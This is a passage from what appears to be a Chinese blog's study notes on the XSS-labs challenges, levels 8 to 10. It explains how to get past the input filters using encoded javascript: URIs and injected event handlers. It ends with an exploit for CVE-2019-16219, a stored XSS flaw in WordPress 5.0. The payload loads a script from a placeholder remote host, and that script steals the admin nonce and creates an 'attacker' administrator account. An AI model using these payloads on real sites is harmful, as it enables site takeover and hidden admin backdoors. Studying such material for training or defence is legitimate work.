class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试输入相关的关键词，看看这题过滤了哪些内容<br><span class="hljs-string">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br><span class="hljs-string">可知，添加了小写转化函数，还有过滤掉了src、data、onfocus、href、script、&quot;</span>（双引号）<br><br>但在这里我们可以利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议<br>将此进行Unicode编码<br>javascript:<span class="hljs-title function_ invoke__">alert</span>()<br>得到<br>Payload：<br>&amp;<span class="hljs-comment">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span><br></code></pre></td></tr></table></figure><h3 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试输入相关的关键词，看看这题过滤了哪些内容<br><span class="hljs-string">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br><span class="hljs-string">当传入的值没有http://</span><br><span class="hljs-string">就会执行if，输出不合法</span><br><span class="hljs-string">所以我们需要向传入的值里面添加http://并用注释符注释掉否则会执行不了无法弹窗</span><br><span class="hljs-string">让函数strpos返回一个数字，构造payload</span><br><span class="hljs-string"></span><br><span class="hljs-string">Payload：</span><br><span class="hljs-string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></code></pre></td></tr></table></figure><h3 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试输入相关的关键词，看看这题过滤了哪些内容<br><span class="hljs-string">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br><span class="hljs-string">查看源码可以发现，传入的参数都被实体化了</span><br><span class="hljs-string">查看源码发现原来还有其他隐藏的传参方法</span><br><span class="hljs-string">这里是get传参t_sort，并过滤掉了&lt;&gt;号，不能闭合插入标签</span><br><span class="hljs-string">但是我们还能用onclick事件，因为这里输入框被隐藏了，需要添加type=&quot;</span>text<span class="hljs-string">&quot;，构造payload</span><br><span class="hljs-string"></span><br><span class="hljs-string">Payload：</span><br><span class="hljs-string">?t_sort=&quot;</span> onclick=javascript:<span class="hljs-title function_ invoke__">alert</span>() type=<span class="hljs-string">&quot;text</span><br></code></pre></td></tr></table></figure><h2 id="XSS实战"><a href="#XSS实战" class="headerlink" title="XSS实战"></a>XSS实战</h2><p><strong>CVE-2019-16219 WordPress5.0存储型XSS漏洞</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">测试<span class="hljs-title class_">Payload</span><br><span class="hljs-string">&quot;&gt;&lt;img src=1 onerror=alert(&quot;</span>xss<span class="hljs-string">&quot;)&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">攻击<span class="hljs-title class_">Payload</span><br><span class="hljs-string">&quot;&gt;&lt;img src=1 onerror=&quot;</span><span class="hljs-attr">javascript</span>:(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://aaa.bbb.ccc.ddd/wpaddadmin.js&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> beef == <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123; <span class="hljs-keyword">var</span> bf = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>); bf.<span class="hljs-property">type</span> = <span class="hljs-string">&#x27;text/javascript&#x27;</span>; bf.<span class="hljs-property">src</span> = url; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(bf);&#125;&#125;)();<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">恶意js</span><br><span class="hljs-string">// Send a GET request to the URL &#x27;/wp-admin/user-new.php&#x27;, and extract the current &#x27;nonce&#x27; value</span><br><span class="hljs-string">var ajaxRequest = new XMLHttpRequest();</span><br><span class="hljs-string">var requestURL = &quot;</span>/wp-admin/user-<span class="hljs-keyword">new</span>.<span class="hljs-property">php</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">var nonceRegex = /ser&quot;</span> value=<span class="hljs-string">&quot;([^&quot;</span>]*?)<span class="hljs-string">&quot;/g;</span><br><span class="hljs-string">ajaxRequest.open(&quot;</span><span class="hljs-variable constant_">GET</span><span class="hljs-string">&quot;, requestURL, false);</span><br><span class="hljs-string">ajaxRequest.send();</span><br><span class="hljs-string">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);</span><br><span class="hljs-string">var nonce = nonceMatch[1];</span><br><span class="hljs-string"></span><br><span class="hljs-string">// Construct a POST query, using the previously extracted &#x27;nonce&#x27; value, and create a new user with an arbitrary username / password, as an Administrator</span><br><span class="hljs-string">var params = &quot;</span>action=createuser&amp;_wpnonce_create-user=<span class="hljs-string">&quot;+nonce+&quot;</span>&amp;user_login=attacker&amp;email=attacker@site.<span class="hljs-property">com</span>&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator<span class="hljs-string">&quot;;</span><br><span class="hljs-string">ajaxRequest = new XMLHttpRequest();</span><br><span class="hljs-string">ajaxRequest.open(&quot;</span><span class="hljs-variable constant_">POST</span><span class="hljs-string">&quot;, requestURL, true);</span><br><span class="hljs-string">ajaxRequest.setRequestHeader(&quot;</span><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-string">&quot;, &quot;</span>application/x-www-form-urlencoded<span class="hljs-string">&quot;);</span><br><span class="hljs-string">ajaxRequest.send(params);</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>XSS</tag>
      
      <tag>XSSlabs</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
